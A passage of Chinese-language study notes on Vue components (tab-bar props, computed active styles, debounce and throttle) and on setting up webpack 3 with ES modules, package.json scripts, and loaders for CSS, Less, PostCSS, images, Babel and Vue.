      type: String,
      default: '#d4237a'
    }
  },
 -->

- 上面我们是动态绑定 class 还决定 活跃状态的颜色的, 现在因为我们要把 父--子的参数拿到 应用在样式中, 所以没办法使用 :class 了
<!-- 
  // 这么写 只能通过 修改源代码去改颜色
  <div v-bind:class='{active: isActive}'>
    <slot name="item-text"></slot>
  </div>

  // 不使用 :class 了  === > 

  <div :style='activeStyle'>
    <slot name="item-text"></slot>
  </div>

  props: {
    path: String,
    activeColor: {
      type: String,
      default: '#d4237a'
    }
  },

  computed: {
    activeStyle() {
      // 是否处于活跃
      return this.isActive ? {color: this.activeColor} : {}
    }
  }
 -->

- 对上解析:
- 我们要通过组件(TabBarItem.vue)调用者来决定当前的活跃状态下 文字和图片显示什么样式
- 1. 所以就需要使用 props 属性, 同时我们在props中设置了默认颜色

- 2. 我们使用 :style='activeStyle' 绑定了一个变量, 同时这个变量又是动���决定的所以 我们要将这个变量放在 computed 计算属性中
<!-- 
  computed: {
   isActive() {
      return this.$route.path.indexOf(this.path) !== -1;
    },
    
    activeStyle() {
      // 是否处于活跃
      return this.isActive ? {color: this.activeColor} : {}
    }
  }

  this.isActive 是计算属性中的变量, 所以它是动态的 看看是否在活跃状态 如果是活跃状态 style='{color: this.activeColor}' 就会变成 用户传递的值

  this.activeColor 是 props 中的属性 用于接收父组件传递进来的参数
 -->

- 3. 在App.vue文件中 把颜色参数传递进来
<!-- 
  <TabBarItem path='/home' activeColor='purple'>

  </TabBarItem>
 -->


> 抽取App.vue中主要组件内容 到一个新的组件里
- 现在的状态是 App.vue 文件里 我们要往组件的插槽里放内容, 导致App.vue文件内的代码太多, 所以把这些代码抽取到一个组件里 再引入进来

- 1. 因为是公共样式, 我们抽取到了 components 文件夹里 起名为 MainTabBar.vue

- 2. 将<TabBar>里所有的内容 贴到 MainTabBar.vue的<template>中

- 3. 将 MainTabBar.vue 文件需要用的组件 导入 并注册, 还有iconfont的css文件

- 4. App.vue文件中引入 MainTabBar.vue 并注册





### 技巧

> style中 导入样式
- @import "../../"


> element ui中 给组件加样式的方式
- 1. 可能需要less
- 2. 选择器前面使用 /deep/
- 3. 给目标组件添加class(或者是目标组件包裹容器)
- 4. 找到目标组件内目标元素身上的类名 添加我们自己的样式
<!-- 
  /deep/ .input-new-tag .el-input__inner {
    width: 120px;
  }
 -->


> loading加载动画
<!-- 
  定义一个loading组件
  然后父组件中请求数据, 比如说3秒之后返回
  然后我们把这个组件引入父组件中, v-show='!listData.length'
 -->


> 一些公共样式可以写在App的样式里面 这样其它组件都可以直接使用



> Vue中的防抖 与 节流
- 我先说下 项目中遇到了什么 导致我需要去研究 防抖和节流的功能
- 背景：
- 我在项目中点击按钮后 随着多次点击 会触发多次事件
- b组件 用了 btn - @click - $bus.$emit("submit")
- a组件 用了 created - &bus.&on("submit")

- 防抖：
- 利用了 setTimeout 原理就是当我点击按钮后 会开启定时器 当我多次点击按钮后 只会关闭之前的定时器后重新计时，而它的效果就是 点击后多少秒触发事件

- 节流：
- 在规定的时间段内只会触发一次 不管点多少次

- 开始我在b组件中 创建了 防抖和节流函数 发现 点击 return 的 function 并没有办法触发
- 随后我去a组件中 给

<!-- 
  methods中定义 函数

  防抖函数
  debounce(fn, delay) {
    let timer = null

    return (...args) => {
      if(timer) clearTimeout(timer)
      timer = setTimeout(() => {
        fn.apply(this, args)
      }, delay)
    }
  }


  节流函数
  throttle(fn, interval) {
    let last = 0
    return (...args) => {
      let now = +new Date()
      if((now - last) > interval) {
        last = now
        fn.apply(this, args)
      }
    }
  }
 -->

- 使用方式：
- 1. 使用防抖函数将 逻辑函数(目标函数)包裹在里面
- 2. 将这个函数交给了一个变量
- 3. 在需要调用防抖函数的位置 调用防抖函数
<!-- 
  created() {
    let debounceSubmit = this.debounce(this.onceFeatureSubmit, 500)
    this.$nuxt.$on("submit", () => {
      debounceSubmit()
    })
  }
 -->




### webpack 和 模块化 相关
--------------------------

### ES模块化的导出和导入
> <script src='./xxx.js' type='module'>
- 在script标签内部 写上type='module' 代表这个js文件 是一个模块 有自己的作用域, 不会产生命名冲突的问题

- 这样就产生一个问题 每一个js文件都是一个模块, 他们都是一个封闭的空间, js文件中的变量不能相互引用, 所以要是想让一个变量可以在另一个js文件中使用, 我们要把这个变量导出去

> 导出 export
- export { }


> 导入 import 变量名 or {解构赋值} from '路径.后缀名'
- 通过解构赋值的方式, 获取到导出的变量

- import { 变量名, 变量名 } from "./路径.后缀名"


> 注意:
- 上面是导出叫什么名字, 我们接收的时候就要用什么名字
<!-- 
  export {
    a
  }

  import {a} from './aaa.js'
 -->


> export default
- 某些情况下, 一个模块中包含某个功能, 我们并不希望给这个功能命名, 而且让导入者可以自己来命名
- 这个时候我们就可以使用export default

- 我们在引入的时候就可以自己起变量名
<!-- default导出的东西只能有有一个 -->

<!-- 
  export default {
    a
  }

  // 我们可以自己起名字
  import asdf from './aaa.js'
 -->



> import 的使用
- 我们使用export指令导出了模块对外提供的借口, 下面我们就可以通过import命令来加载对应的这个模块了

- 首先 我们需要在html代码中引入两个js文件, 并且类型需要设置为module
<!-- 只有type是module才支持这种语法 浏览器底层给我们做了支撑 -->
  <script src='./bbb.js' type='module'></script>
  <script src='./aaa.js' type='module'></script>

- import指令用于导入模块中的内容, 比如main.js的代码

  import {name, age, height} from './info.js'


> 统一全部导入
> import * as info(自定定义的名) from './info.js'
- 如果我们希望某个模块中所有的信息都导入, 一个个导入显然有些麻烦, 有可能导入的变量名和我们文件的变量名冲突
<!-- 比如上面有name age height需要导出 -->
  - 我们可以通过 * 可以导入模块中所有的 export变量
  - 但是通常情况下 我们需要给 * 起一个别名, 方便后续的使用
  - 相当于把所有变量都放入 info 里面

  import * as info from './info.js'
  console.log(info.name, info.age, info.height)

--------------------------

### Webpack
- webpack是一个现代的js应用的静态模块打包工具, 从两个点来解释前面的话就是 模块 和 打包

> 前端模块化
- 在前面学习中, 我们提到了目前使用前端模块化的一些方案, 比如commonjs es6
- 在es6之前 我们要想进行模块化的开发, 就必须借助于其他的工具, 让我们可以进行模块化的开发
<!-- 
  因为浏览器不认识commonjs es6的语法 想在浏览器端执行必须要依赖其他的转译工具
 -->
- 并且在通过模块化开发完成了项目后, 还需要处理模块间的各种依赖, 并且将其进行整合打包
<!-- 
  各种依赖, 我们用模块化开发的网页 模块之间存在了相互引入, 这就像一张关系网 这就是各种依赖的解释, 我们的依赖关系不管多么复杂 最终webpack都能帮你处理好
 -->

- webpack可以帮助我们把模块化的规范, 依赖等问题, 处理为浏览器认识的代码

- 而且不仅仅是js, 我们的css 图片, json文件等等在webpack中都可以被当做模块来使用, 这就是webpack中模块化的概念

> 打包
- 理解了webpack可以帮助我们进行模块快, 并且处理模块化之间的各种复杂关系后, 打包的概念就非常的好理解了
- 将是将webpack中的各种资源模块进行打包合并成一个或多个保(bundle)
- 并且在打包的过程中, 还可以对资源进行处理, 比如压缩图片, 将scss转为css, 将es6语法转为es5语法, 将ts转成js等等操作
- 但是打包的操作思域grunt gulp也可以帮助我们完成, 他们有什么不同呢


> grunt / gulp的对比
- grunt / gulp的核心是task
- 我们可以配置一系列的task, 并且定义task要处理的事物(比如es6 ts转化 图片压缩 scss转成css)
- 之后让grunt / gulp来依次执行这些task 而且让整个流程自动化
- 所以grunt / gulp也被称为前端自动化任务管理工具

- 什么时候使用grunt gulp呢?
- 如果你的工程模块依赖非常简单, 甚至没有用到模块化的概念
- 只需要进行简单的合并, 压缩, 就使用grunt glup即可
- 但是如果整个项目使用了模块化管理, 而且相互依赖非常强, 我们就可以使用更强大的webpack了

> webpack 和 gulp的不同
- grunt gulp更加强调的是前端流程的自动化, 模块化不是它的核心
- webpack更加强调模块化开发管理, 而文件压缩合并, 预处理等功能, 是它附带的功能

--------------------------

### webpack的安装
- webpack是依赖于node环境的
<!-- 
  比如我们再浏览器端使用了js png less css 模块化 我们部署到服务器上后 用户通过服务器下载的东西, 这些东西都不能运行

  浏览器 ---- webpack ---- 服务器

  我们将这些东西 通过 webpack 进行模块化打包之后会生成一个文件夹, 把这个文件夹放到服务器进行部署就可以了

  webpack要想运行 本身就需要依赖一个环境 node环境
 -->

- 安装 webpack 首先需要安装node.js node.js自带了软件包管理功能 npm

- 全局安装webpack(这里我们先指定版本号 3.6.0 因为vue cli2依赖该版本)
<!-- 
  vue cli3中已经升级到webpack4 但是它将配置文件隐藏起来了, 所有查看起来不是很方便
 -->

  npm install webpack@3.6.0 -g

- 局部安装 webpack( 后续才需要 )
  
  --save-dev 是开发时依赖, 项目打包后不需要继续使用的

- 我们可以用下 webpack --version 查看下安装成功没有
- 为什么全局安装后, 还需要局部安装呢?
  - 在终端直接执行webpack命令, 使用的全局安装的webpack
  - 当在package.json定义了script时, 其中包含了webpack命令, 那么使用的是局部webpack

--------------------------

### webpack的基本使用过程
- webpack在打包的时候, 会从入口js文件中(main.js)查找依赖的模块, 根据入口js文件的依赖来进行打包
<!-- 
  main.js文件依赖了什么 就会对响应的文件(模块)打包

  webpack在打包的时候会看main.js里面依赖了什么, 它会根据依赖一层层的去找(比如再看看info.js文件中依赖了什么), 只有依赖的文件才会进行打包

  所以要打包的文件, 最好在main.js文件中 进行依赖
 -->

> 文件夹结构
  | - dist文件夹: 用于存放之后的打包文件
  | - src文件夹:  用于存放我们写的源文件
    | - main.js:      项目的入口文件, 具体内容查看下面详情
    | - mathUtils.js: 定义了一些数学工具函数, 可以在其他地方引用, 并且使用, 具体内容查看下面的详情

  | - index.html:   浏览器打开展示的首页html
  | - package.json: 通过npm init生成的, npm打包管理的文件(暂时没有用上, 后面才会用上)

<!-- 
  我们将代码写到main.js中, 然后通过打包生成到dist文件夹, 最终我们要将dist文件夹发布到 服务器上

  之后index.html文件也要放入到dist文件夹内, 因为dist文件夹要部署到服务器上 我们是通过另一个工具自动将index.html文件放入到dist文件夹里面
-->

> 我们来看下模块化开发的基本应用
- 我们定义一个数据工具类js文件, 使用commonjs规范将工具函数导出
<!-- 
  function add(num1, num2) {
    return num1 + num2;
  }
  function mul(num1, num2) {
    return num1 * num2;
  }

  // 我们将这两个方法导出 在main.js中应用
  module.expotrs = {
    add,
    mul
  }
 -->

- 我们在main.js中文本中引入
<!-- 
  // 导入数学工具类后 在这个js文件中使用
  let {add, mul} = require('./mathUtils')

  console.log(add(20, 30));
  console.log(mul(20, 30))
 -->

- 之后我们要打印测试下上面的代码, 但是我们要在页面中按照下面的方式引入的话, 会出现浏览器根本不认识commonjs规范
<script src="./src/main.js"></script>

- 之前我们都是通过 工具来对js文件进行编译后, 使其可以在浏览器中运行, 现在我们使用webpack工具来走一遍看看


> webpack的基本使用
- 我们再开发的阶段都是使用commonjs规范来开发的, 然后用webpack对main.js进行打包, 打包出来一个浏览器可以认识的文件 让我们的index.html去引入浏览器能认识的文件(打包的文件)就可以了

- 命令
- 在项目的根目录下
- webpack 主要js文件所在的目录 空格 目标目录/文件名.js
- webpack ./src/main.js ./dist/bundle.js
<!-- 
  我们只需要打包主要文件就可以, 依赖关系webpack会帮助我们处理
 -->

> 注意 新版本需要在 两个路径之间加上 -o
webpack ./src/main.js -o ./dist/bundle.js

--------------------------

### webpack.config.js配置 和 package.json配置
- 上面学习了打包文件的方式, 需要指定打包哪个文件输出到哪里, 命令太长, 为了解决这个问题 我们还有另外一个打包方式 只需要简单的命令webpack就可以自己去找入口文件是什么, 出口在哪里, 为了完成这点, 所以我们需要对webpack.config.js文件进行配置

> 创建  webpack.config.js
- 在根目录下右键 创建这个文件, 在这个文件中我们进行如下配置
<!-- 目前对我自己来讲 这个文件名要求是固定的  -->
- 当我们在 webpack.config.js 文件中定义完入口和出口后 终端里执行webpack命令后它会自动找webpack.config.js这个文件 找入口和出口

<!-- 
  const path = require('path')

  // 在这里用commonjs的规范导出一个对象
  module.exports = {

    // 文件的入口
    entry: './src/main.js',

    // 文件的出口
    output: {
      path: path.resolve(__dirname, 'dist'),
      filename: 'bundle.js'
    }
  }
 -->

> 配置 webpack.config.js的 具体步骤
- 1. 首先我们要导入一个 path模块(第三方模块)
<!-- 这个模块是安装node时自带的包 -->

  const path = require('path')

- 2. 使用 module.exports = { } 的方式 导出一个对象

  module.exports = {
    entry: './src/main.js',
    output: {
      path: path.resolve(__dirname, 'dist'),
      filename: 'bundle.js'
    }
  }
<!-- 
  相关参数:
  entry:    入口文件路径(要打包的目标文件)
  output:   出口路径 这里我们要动态获取绝对路径, webpack.config.js文件在哪 就从哪开始获取

  output: {   内部有两个参数
    path: path.resolve(__dirname, '出口的文件夹'),
    filename:   出口文件的名字
  }

  path模块有两个函数 用来动态获取出口的绝对路径和相对路径
  path.resolve()   它是做绝对路径的
  path.join()      它是做相对路径的

  __dirname:
  这是node上下文里自带的全局变量, 不用我们自已定义 它保存着 webpack.config.js这个文件所在的路径

  resolve()函数的作用:
  它的作用是对__dirname 和 'dist' 文件夹进行拼接
 -->

> 使用 node 包时的注意点
- 一旦我们的项目中涉及到node相关的东西的时候, 我们首先要在根目录下创建 package.json 文件
<!-- 
  npm init 
  文件名中不要有中文, 和奇怪的符号
-->

- package.json文件 这个是告诉我们当前项目的一些信息的, 对当前项目的描述, 开发时的依赖, 运行时的依赖, 脚本配置等
<!-- 
  如果当前项目有依赖的情况下(在package.json里面有体现有的话) 我们输入 npm install 命令, 会自动安装依赖文件

  所以,
  一旦项目里有包的情况就把package.json创建好 node需要这个文件帮助我们管理项目中所要用到的包
 -->


> 配置 package.json文件 相关部分
- 我们只要是在终端中输入命令 都是全局下命令 而不是本地, 不管是不是在根目录下开启的终端

- 那在终端里面怎么使用本地的命令 怎么办?
<!-- 
  1. 我们要在局部安装响应的包
  2. 进入局部包中的路径 输入完整路径使用命令 比如:

  ./node_modules/.bin/webpack 后面接相关代码
 -->

> 命令的映射
- 这里我们会说下怎么使用局部命令 以及局部命令和全局命令的区别, 优点

>> 首先:
- 在真实开发的时候, 本地也会安装响应的包(webpack的包)
<!-- 
  因为我们本地项目依赖的webpack很有可能是和全局不一样的, 
  比如全局的webpack是4.xx版本 
  而局部依赖的可能是3.xx的版本

  这个时候我们再在终端中执行webpack的话就会执行4.xx版本的webpack命令
  
  可我们项目的构建依赖于3.xx版本
  我们用4.xx版本的文件打包3.xx创建的项目 很多东西可能就出错了所以一般我们还要搞一个本地的

  因为本地的才是和我们项目同步的 全局用的比较少
 -->

>> 其次:
- 配置 package.json 文件, 让webpack命令 和 npm命令相互映射起来

- 这样 我们通过配置 package.json 文件后, 执行 npm run build命令就是优先使用本地的包文件(webpack文件)

  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    
    "build": "webpack"      // 看这里
  },

<!-- 
  1. 开package.json文件里面有 script部分

  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },

  这个部分是 脚本的意思
  意味着我们可以在终端中 执行通过 npm run test
  
  执行test脚本 会执行后面的命令的 "echo \"Error: no test specified\" && exit 1"

  所以我们可以这么配置
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",

    "build": "webpack"
  },

  这样就意味着 如果我执行 npm run build这个命令的时候 它会对应的执行webpack这个命令(好像快捷键啊)


  package.json中的script的脚本在执行时, 会按照一定的顺序找命令对应的位置

  - 1. 首先会寻找本地的node_modules/bin路径总对应的命令
  - 2.   如果没有找到, 会去全局的坏境变量中寻找
 -->

>本地我们也安装一个webpack
npm install webpack@3.6.0

> npm有两个概念
- 开发时依赖  --save-dev
<!-- 
  只有在开发时才会需要用到webpack这个东西 运行时不需要因为webpac的作用就是把我们东西打包 把包放到服务器 打包后webpack就没有用了

  所以我们在安装这种包的时候 后面可以跟上 --save-dev

  安装好后 package.json文件中 会多出一个
  "decDependencies" :{
    "webpack": "^3.6.0"
  }
 -->
- 运行时依赖
<!-- 
  运行时依赖 项目想打包的东西会放到运行时依赖里面
  "dependencies" :{
    
  }
 -->

--------------------------

### webpack中使用css文件的配置
- 上面学完了webpack一部分的内容, 我们以后在开发项目的时候, 就可以随便用模块化开发了, 开发完之后我们用webpack进行下打包即可

- 可是我们项目中不仅有js文件, 还会有css和图片等等, 我们要是想对这些也做一些打包处理怎么操作?

- 我要对css文件 scss less jsx vue等文件处理的话 我们还需要知道一个概念 loader

> 什么是loader
- loader是webpack中一个非常核心的改变
- webpack用来做什么的?

  - 之前的示例中, 我们主要是用webpack来处理我们写的js代码, 并且webpack会自动处理js之间的相关依赖

  - 但是在开发中我们不仅仅有基本的js代码处理, 我们也需要加载css, 图片, 也包括一些高级的讲es6转成es5代码, 将ts转为es5代码, 将scss less转成css, 将jsx, vue文件转为js文件等等

  - 对于webpack本身的能力来说, 对这些转化是不支持的, 所以我们要webpack扩展对应的loader就可以了

> loader使用过程
- 1. 通过npm 安装需要使用的 loader
<!-- 不同的文件处理会用到不同的loader -->

- 2. 在webpack.config.js中的modules关键字下进行配置
<!-- 
  大部分loader我们都可以在webpack的官网中找到, 并且学习对应的用法
-->

> 都有哪些loader
- https://webpack.docschina.org/loaders/

- loader -- 样式 -- 在这里
<!-- 
  style-loader 将模块导出的内容作为样式并添加到 DOM 中
  css-loader 加载 CSS 文件并解析 import 的 CSS 文件，最终返回 CSS 代码
  less-loader 加载并编译 LESS 文件
  sass-loader 加载并编译 SASS/SCSS 文件

  postcss-loader 使用 PostCSS 加载并转换 CSS/SSS 文件

  stylus-loader 加载并编译 Stylus 文件
  Linting 和测试 

 -->



### 我们先来看看css文件处理
- 项目开发过程中, 我们必然需要添加很多的样式, 而样式我们往往写到一个单独的文件中
<!-- 
  注意开发中不要在index.html文件中引入css文件, 我们可以将css文件也当做一个模块打包到bundle.js文件中

  把css文件打包在bundle.js文件中, 就意味着我们不用引入css文件, 直接引入入口js文件就可以了
  什么css less 都把它们当做模块引入到main.js中就可以了
 -->

- css模块的打包需要两个loader css-loader 和 style-loader
- webpack在读取多个loader的时候 是从右向左读的

- 新的目录结构作为参考
<!-- 
  |- dist
  |- node_modules
  |- src
    |- css
    |- js
    main.js     // 这个不用放到js文件夹里面 做为入口的东西不要往文件夹里放
  index.html
  package.json
  webpack.config.js
 -->

> 我们来举个小例子
- 真实开发中不可能只有js文件 还会有css文件吧
- 不要在

- 在src目录中, 创建一个css文件夹, 其中创建一个normal.css文件
- 我们也可以重新组织文件的目录结构, 将零散的js文件放在一个js文件夹中

- normal.css中的代码非常的简单, 就是将body设置为red

- 但是 这个时候normal.css的样式会生效么?
<!-- 
  文件中我们只引入了入口的js文件 main.js
 -->
  - 当然不会, 因为我们压根就没有引用它
  <!-- 
    main.js中没有依赖css文件, 打包的时候css文件就不会被打包
   -->
  - webpack也不可能找到它, 因为我们只有一个入口, webpack会从入口开始查找其它的依赖文件
  <!-- 会一层层的找 别的js文件也会看 看依赖关系 -->

> 1. 我们在入口js文件中引入css文件
  require('./css/normal.css');

> 2. 安装css-loader
  npm install --save-dev css-loader@2.0.2
- css-loader 负责解析css文件
<!-- css-loader的版本到0.28.11 / 2.0.2-->

> 3. 安装style-loader
  npm install --save-dev style-loader@0.23.1
-  将解析的css文件加载的dom中
<!-- 
  npm uninstall css-loader
  0.15.0 / 0.23.1
-->

> 4. 在webpack.config.js文件中配置相关信息
- 在定义入口 和 出口的后面 添加module 值为{}
- rules 是规则的意思
<!-- 
  - rules
  const path = require('path');
  module.exports = {
    entry: "./src/main.js",
    
    output: {
      path: path.resolve(__dirname, './dist'),
      filename: "bundle.js"
    },

    module: {
      rules: [
        { 
          // 匹配所有的css文件, 匹配到css文件后就会对css文件应用下面的两个loader

          test: /\.css$/i,
          use: ["style-loader", "css-loader"],
        },
      ],
    }
  }
 -->

> 再运行 npm run build 命令打包

--------------------------

### webpack中使用css文件的配置
- 如果我们希望在项目中使用less scss stylus来写样式, webpack是否可以帮助我们处理呢?
- 我们这里以less为例, 其它也是一样的
- 我们还是先创建一个less文件, 依然放在css文件夹中

- 创建好less后 我们还是要给这个文件引入到main.js的入口文件里面, 这样webpack会从入口文件开始查找依赖关系对依赖文件进行打包

> 1. 我们在入口js文件中引入less文件
  require('./css/special.less');

<!-- 
  我们执行 npm run build
  ↓
  会先去package.json中找script中的build对应的webpack命令
  ↓
  会去webpack.config.js中查找入口文件 查找依赖 对依赖文件做编译打包
 -->

> 2. 安装less 和 less-loader
- 在项目根目录下安装
  npm install less less-loader --save-dev
<!-- 
  我们这里指定版本
  npm install --save-dev less-loader@4.1.0 less@3.9.0
-->

> 3. 在webpack.config.js中添加less-loader的相关添加规则
- 在官网上复制 按{ }复制就可以
<!-- 
  {
    test: /\.less$/i,
    loader: [
      // compiles Less to CSS
      "style-loader",
      "css-loader",
      "less-loader",
    ],
  }
 -->

> 4. 再运行 npm run build 命令打包

--------------------------

### webpack 配置post css
- 这部分是在nodejs中看到的, 不知道webpack和post的版本是否相匹配
- www.postcss.com.cn
- https://www.npmjs.com/package/postcss-loader

> 安装 postcss-loader 和 autoprefixer
- npm install postcss-loader autoprefixer --save-dev

> 在项目内创建 postcss.config.js 文件
- 写上配置
<!-- 
  const autoprefixer = require('autoprefixer');
  module.exports = {
    plugins: [autoprefixer]
  };


  // 下面的是cli2自动生成的 借鉴一下
  module.exports = {
  "plugins": {
    "postcss-import": {},
    "postcss-url": {},
    // to edit target browsers: use "browserslist" field in package.json
    "autoprefixer": {}
  }
}
 -->

> webpack.config.js
- 是不是要写在less loader上面就不知道了
<!-- 
  module.exports = {
    module: {
      rules: [
        {
          test: /\.css$/i,
          use: ["style-loader", "css-loader", "postcss-loader"],
        },
      ],
    },
  };
 -->
  
--------------------------

### webpack中对图片文件的处理
- 在实际开发项目中也离不开对图片的一些处理
- 这块我们讲讲对于图片是怎么配置的, 先来些准备工作, 我们先把一张图片作为网页的背景图片
<!-- 
  css -- normal.css -- background:url('./test/png')
  
  上面的属于修改, 我们需要重新npm run build下 这样会先去找入口文件 然后找依赖

  当读到css文件中 有图片的时候background:url('./test/png') webpack也会把图片当做 模块 去加载这张图片的

  也就说说 图片的加载也需要一个loader

  也是一样的流程 我们要去 下载对应的loader 

  官网 --- loader --- 文件 --- url-loader
  // 图片是通过url引入进来的

  我使用的是18kb的 title-font-1_5363c50.png
 -->

> 注意 url-loader 在webpack5之后就弃用了
- 资源模块(asset module)是一种模块类型，它允许使用资源文件（字体，图标等）而无需配置额外 loader。

- 通过资源模块 代替了 
- https://webpack.docschina.org/guides/asset-modules/
<!-- 
  raw-loader  将文件导入为字符串
  url-loader  将文件作为 data URI 内联到 bundle 中
  file-loader 将文件发送到输出目录
 -->


> 1. 下载url-loader 和 file-loader
- npm install --save-dev url-loader@1.1.2
- npm install --save-dev file-loader@3.0.1
<!-- 跟着视频学的时候 -->
<!-- 
  当webpack在加载图片的时候会看 图片的尺寸是大于limit还是小于limit
  如果小于limit就会用 url-loader直接加载, 并且将它直接编译成base64的字符串形式

  如果大于limit就会用 file-loader对图片进行加载, file-loader不需要特别的配置, 只需要直接安装就可以了
 -->

> 2. 在webpack.config.js中 对 url-loader 进行配置
- 在ues中如果放入对象类型的话除了可以写loader之外, 还可以写options参数
- file-loader老师没配置
<!-- 
  {
    test: /\.(png|jpg|jpeg|gif)$/i,
    use: [
      {
        loader: 'url-loader',
        options: {
          limit: 8192,
        },
      },
    ],
  },

  // file-loader的规则 但是好像不用配置
  {
    test: /\.(png|jpe?g|gif)$/i,
    use: [
      {
        loader: 'file-loader',
      },
    ],
  },
 -->


> loader规则中的 options的属性: limit
- 当加载的图片小于limit的时候, 会将图片编译成base64字符串形式
<!-- 
  limit中的数值是 x1024后的结果 
  上面的8192要 / 1024 才知道 limit是对多少kb的图片做限制 8kb
-->

<!-- 
  Base64是一种用64个字符来表示任意二进制数据的方法, 一种最常见的二进制编码方法。

  它可以把字符串图片等转换为字符串的形式
 -->

- 当使用file-load来打包图片文件的时候, 自动在dist文件夹中生产一个非常长的名字, 这是一个32位的hash值

- 但是在真是开发中, 首先我会希望dist文件夹中图片应该有图片专门的文件夹, 同时我们可能对打包的图片名字有一定的要求, 比如将所有的图片放在一个文件夹中, 跟上图片原来的名字, 同时也要防止重复

- 我们再options中还可以配置下面的属性:
<!-- 
  options: {
    limit:8192,
    name: 'img/[name].[hash:8].[ext]'
  }

  img:  文件要打包到的文件夹
  name: 获取图片原来的名字, 放在该文职
  hash:8: 为了防止图片名称冲突 依然使用hash, 但是我们只保留8位
  ext:  使用图片原来的扩展名
 -->


> url-loader的使用流程
- 当webpack帮助我们加载图片的时候(url方式加载图片的时候), 需要依赖url-loader, 在url-loader的规则中有limit属性, url-loader会先看我们加载的图片是否大于limit

- 如果小于limit 那么webpack会使用url-loader直接将图片转换为base64格式的字符串通过这个字符串将图片显示出来

- 如果大于limit 那么webpack会需要file-loader, 来加载图片


> url-loader 和 file-loader 对于图片的存储
- 如果小于limit属性值的图片 会通过url-loader对图片进行加载, webpack会把这张图片转换为base64的字符串格式, 加载到页面中, 也就是说对于小于limit的图片来说, 它就是字符串, 不需要以文件的形式进行存储(比如存储为1.jpg)

- 如果大于limit属性值的图片, 会通过file-loader对图片进行加载, file-loader会把图片当做一个文件, 如果是文件的话, 就会被webpack打包, 需要将该图片文件打包到dist文件夹内, 等到发布的时候会连同 bundle.js和图片一起进行发布
<!-- 
  通过file-loader打包的图片文件, 会在 dist 文件夹内生成一个打包后的图片, 并且为了让所有的图片不重名该图片会被改写为哈希名
 -->


> 通过file-loader加载的图片还需要在 webpack.config.js中进行额外的配置
- 在webpack.config.js中的output中添加publicPath:'dist/'
<!-- 
  output: {
    path: path.resolve(__dirname, './dist'),
    filename: "bundle.js",
    publicPath: 'dist/'       这里
  },
 -->
- 这样做的话以后只要涉及到url相关的东西都会在前面添加个dist/

    publicPath: 'dist/'

- 这个属性的目的就是在url前面加上对应的路径 让index.html链接到dist中的文件

> 注意:
- 我们现在是把index.html放在根目录下, 所以需要配置publicPath: 'dist/
- 如果以后我们学了把index.html文件也打包到dist文件夹里面的时候, 就不需要publicPath: 'dist/了

--------------------------

### webpack中对ES6语法处理
- 如果我们仔细阅读webpack打包的js文件, 发现写的es6语法并没有转成es5, 那么就意味着可能一些对es6还不支持的浏览器没办法很好的运行我们的代码

- 在前面我们说过, 如果希望将es6的语法转成es5, 那么就需要使用babel
- 而在webpack中, 我们直接使用babel对应的loader就可以了

> 1. 下载babel
- npm install --save-dev babel-loader@7 babel-core babel-preset-es2015
<!-- 
  弹幕说没有7了
  npm install --save-dev babel-loader babel-core babel-preset-es2015
 -->

> 2. 配置webpack.config.js文件
<!-- 
// webpack官网上的
  {
    test: /\.m?js$/,
    exclude: /(node_modules|bower_components)/,
    use: {
      loader: 'babel-loader',
      options: {
        presets: ['@babel/preset-env']
      }
    }
  }

// 老师的
{
  test: /\.m?js$/,
  exclude: /(node_modules|bower_components)/,
  use: {
    loader: 'babel-loader',
    options: {
      presets: ['es2015']
    }
  }
}
 -->

- 属性:
- exclude: 排除 我们对es6转化的时候只转化src文件夹里面的东西就可以了 排除我node_modules里面的文件

- presets: ['@babel/preset-env'] 
- 如果这么配置的话, 就会去报babel rc的文件, 我们没有用rc文件, 所以我们这么写
<!-- 
  presets: ['es2015']
 -->

> 3. 重新打包 npm run build

--------------------------

### webpack 配置vue
- 后续项目中, 我们会使用vuejs进行开发, 而且会以特殊的文件来组织vue组件, 所以下面我们要学习如何在webpack环境中继承vuejs

- 之前我们使用vue的时候会在script标签中引入vue.js来学习vue, 这种方式不是通过模块化的方式管理我们的vue

- 现在我们希望在项目中使用vuejs 那么必须需要对其有依赖, 所以需要先进行安装
<!-- 因为我们后续是在实际项目中也会使用vue的, 所以并不是开发时依赖 -->
- npm install vue --save
<!-- 
  通过这种方式安装vue vue就会被安装到node_modules文件夹中, 我们就可以把vue当做一个模块了
 -->

> 使用vue
> 1. 在入口js文件中, 先引入vue, 让入口文件对vue进行依赖
<!-- 安装是安装, 依赖是依赖 -->
- 使用:
- import Vue from 'vue';

> 2. 在入口文件中, 创建vue实例, 然后npm run build
<!-- 
  import Vue from 'vue';

  const app = new Vue({
    el:'#app',
    data: {
      message: '我一定可以的'
    }
  })
 -->

> 上面再次对入口js文件打包时报错
- 说我们使用了runtime-only版本
<!-- 
  bundle.js:928 [Vue warn]: You are using the runtime-only build of Vue where the template compiler is not available. Either pre-compile the templates into render functions, or use the compiler-included build.
 -->
- 上面报错的原因
- vue在最终发布的时候构建了两类版本
- 一类叫做 runtime-only
<!-- 
  使用这个版本中 代码中不可以有任何的template

  div#app 这个div也属于vue实例的template
  因为这个版本里不含有对template编译的代码 它只管运行 不管编译
 -->
 
- 一类叫做 runtime-compiler
<!-- 
  使用这个版本中 代码中可以有template
  因为有compiler代码可以用于编译template
 -->

> 解决方法
- 我们修改下webpack的配置, 添加如下内容即可 我们可以指定使用 runtime-compiler版本

> 3. 修改webpack.config.js配置 关于vue的
- 添加如下属性
- 下面的属性意思是: 当我在入口js文件中
- import Vue from 'vue'的时候, 它会先看看vue有没有指向一个具体的文件夹,
- 我们把 'vue$': 'vue/dist/vue.esm.js' 指向了一个具体的文件夹, 这样它就不会按照默认的方式去找某个文件了
<!-- 
  vue发布了一堆的版本 我们让它指定一个
  node_modules --- vue --- dist --- vue.esm.js

  选择这个后 我们相当于使用了 runtime-compiler了
 -->
<!-- 
  resolve: {
    alias: {
      'vue$': 'vue/dist/vue.esm.js'
    }
  }
 -->

> 4. 运行打包命令

--------------------------

### 创建vue时 template 和 el的区别
- 以前我们创建vue实例的时候会这样, 在真是开发的时候app是不用的
<!-- 
  const app = new Vue({ ... })
  new Vue({ ... })    一般这样就可以

  之所以把vue实例赋值给app, 是因为平时的时候我们可以在控制台通过 app.变量的形式做演示
 -->

- 通过前几讲之后我们可以正常使用vue了, 但是如果我们希望将data中的数据显示在界面中, 就必须是修改index.html

- 如果我们后面自定义了组件, 也必须修改index.html来使用组件
